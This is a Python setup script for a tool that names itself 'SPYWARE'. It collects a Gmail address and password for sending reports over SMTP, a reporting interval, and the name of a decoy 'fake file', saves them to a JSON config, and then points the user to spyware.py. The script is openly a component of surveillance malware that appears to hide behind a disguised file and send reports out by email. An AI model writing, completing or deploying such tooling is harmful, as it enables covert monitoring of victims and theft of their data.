import os
import json
from termcolor import colored
from pyfiglet import figlet_format
import re


def create_file(email, password, report_period, fake_file_name):
    info = {
        'email': email,
        'password': password,
        'frequency': report_period,
        'fake_file_name': fake_file_name
    }

    if not os.path.isdir('./user_info'):
        os.mkdir('user_info')
        print('[+] Created ./user_info directory')

    with open('./user_info/info.json', 'w+') as output_file:
        json_dump = json.dumps(info)
        output_file.write(json_dump)

    print('[+] Created ./user_info/info.json file')


def validate_input(regex, input_question, error_message):
    result = True

    while result:
        user_input = input(input_question)
        match = re.search(regex, user_input)

        try:
            match.group()
            result = False
            return user_input

        except AttributeError:
            print(error_message)


def main():
    app_name = colored(figlet_format('SPYWARE'), color='magenta')

    print(app_name)
    print('- By dszyszek')
    print('===============================================================\n')
    print('You\'ll need gmail account to process (program uses their SMTP server)')

    email = validate_input('[A-Za-z0-9\.\+_]+@gmail\.com', 'Email: ', 'Wrong email!\n')

    passwword = input('Password: ')
    report_period = input('Input frequency of reports (in seconds): ')
    fake_file_name = validate_input('.+\.[A-Za-z]{1,5}', 'Input name of the fake file (with extension; it should be in /fake_file directory): ', 'Wrong name of file!\n')

    create_file(email, passwword, report_period, fake_file_name)

    print(colored('\nOk, we\'re set, now run spyware.py file', color='yellow'))


if __name__ == '__main__':
    main()